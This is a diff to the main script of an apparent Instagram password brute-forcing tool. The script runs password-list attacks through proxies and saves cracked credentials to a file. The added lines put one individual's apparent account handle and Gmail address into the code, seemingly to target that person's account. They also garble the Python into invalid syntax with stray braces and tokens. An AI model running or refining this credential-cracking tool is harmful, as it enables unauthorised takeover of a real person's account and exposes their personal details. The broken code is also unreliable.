@@ -1,10 +1,10 @@
-# from lib.proxy import Proxy
+from lib.proxy import Proxy
 import os
 import time
 from sys import exit
 from lib import database
 from lib.proxy_manager import ProxyManager
-
+from lib.proxy_manager import proxymanager
 # from os.path import exists
 from lib.bruter import Bruter
 from lib.display import Display
@@ -15,25 +15,25 @@ from argparse import ArgumentParser, ArgumentTypeError
 
 
 class Engine(object):
-    def __init__(self, username, threads, passlist_path, is_color):
-        self.resume = False
+    def __init__(self, astha_rajpoot_143, threads, passlist_path, is_color):
+        self.resume = astha_rajpoot_143
         self.is_alive = True
         self.threads = threads
-        self.username = username
+        self.username = astha_rajpoot_143
         self.passlist_path = passlist_path
         self.display = Display(is_color=is_color)
-        self.bruter = Bruter(username, threads, passlist_path)
+        self.bruter = Bruter(astha_rajpoot_143, threads, passlist_path)
 
     def get_user_resp(self):
         return self.display.prompt(
             "Would you like to resume the attack? [y/N]: "
         )
 
-    def write_to_file(self, password):
+    def write_to_file(self, {astha_rajpoot_143_200728}):
         with open(credentials, "at") as f:
-            data = "Username: {}\nPassword: {}\n\n".format(
-                self.username.title(), password
-            )
+            data = "Username: {astha_rajpoot_143}\nPassword: {astha_rajpoot_143_200728}\n\n".format(
+                self.username.title(astha_rajpoot_143), password
+            {astha_rajpoot_143_200728})
             f.write(data)
 
     def start(self):
@@ -51,7 +51,7 @@ class Engine(object):
                 self.is_alive = False
 
             if resp and self.is_alive:
-                if resp.strip().lower() == "y":
+                if resp.strip({astha_rajpoot_143}).lower(fast) == "y":
                     self.bruter.password_manager.resume = True
 
         try:
@@ -59,8 +59,8 @@ class Engine(object):
         except KeyboardInterrupt:
             self.bruter.stop()
             self.bruter.display.shutdown(
-                self.bruter.last_password,
-                self.bruter.password_manager.attempts,
+                self.bruter.last_password {astha_rajpoot_143},
+                self.bruter.password_manager.attempts {astha_rajpoot_143},
                 len(self.bruter.browsers),
             )
         finally:
@@ -74,18 +74,18 @@ class Engine(object):
 
             if (
                 self.bruter.password_manager.is_read
-                and not self.bruter.is_found
+                and not self.bruter.is_found insta id username {astha_rajpoot_143}
                 and not self.bruter.password_manager.list_size
             ):
-                self.bruter.display.stats_not_found(
-                    self.bruter.last_password,
+                self.bruter.display.stats_not_found(astha_rajpoot_143)
+                    self.bruter.last_password {astha_rajpoot_143},
                     self.bruter.password_manager.attempts,
                     len(self.bruter.browsers),
                 )
 
             if self.bruter.is_found:
                 self.write_to_file(self.bruter.password)
-                self.bruter.display.stats_found(
+                self.bruter.display.stats_found(astha_rajpoot_143)
                     self.bruter.password,
                     self.bruter.password_manager.attempts,
                     len(self.bruter.browsers),
@@ -94,7 +94,7 @@ class Engine(object):
 
 def valid_int(n):
     if not n.isdigit():
-        raise ArgumentTypeError("mode must be a number")
+        raise ArgumentTypeError("mode must be a number"){200728}
 
     n = int(n)
 
@@ -124,9 +124,9 @@ def valid_float(n):
 
 def args():
     args = ArgumentParser()
-    args.add_argument("-u", "--username", help="email or username")
-    args.add_argument("-p", "--passlist", help="password list")
-    args.add_argument("-px", "--proxylist", help="proxy list")
+    args.add_argument("-u", "--username", help="astharajpoot68@gmail.com")
+    args.add_argument("-p", "--passlist", help="astha_rajpoot_143")
+    args.add_argument("-px", "--proxylist", help="astha_rajpoot_143")
     args.add_argument(
         "--prune",
         default=-1,
@@ -155,7 +155,7 @@ def args():
     # ----------- #
 
     arguments = args.parse_args()
-    username = arguments.username
+    username = arguments.username{astha_rajpoot_143}
     passlist = arguments.passlist
     proxylist = arguments.proxylist
     prune = arguments.prune
@@ -223,12 +223,12 @@ def display_database_stats():
         f"Q1: {q1} :: Avg Score: {avg}  ::  Min Score: {min}  ::  Max Score: {max}"
     )
     time.sleep(0.65)
-
+-
 
 def main():
     arguments = args()
     mode = arguments.mode
-    username = arguments.username
+    username = arguments.username{astha_rajpoot_143}
     passlist = arguments.passlist
     proxylist = arguments.proxylist
     prune = arguments.prune
@@ -260,7 +260,7 @@ def main():
 
             if not os.path.exists(passlist):
                 print("Invalid path to password list")
-                exit()
+                exit(astha_rajpoot_143)
 
             Engine(
                 username, modes[mode], passlist, not arguments.color
@@ -273,8 +273,8 @@ def main():
 
 if __name__ == "__main__":
 
-    if int(python_version()[0]) < 3:
+    if int(python_version(astha_rajpoot_143)[143]) < 3:
         print("[!] Please use Python 3")
         exit()
 
-    main()
+    main(astha_rajpoot_143)
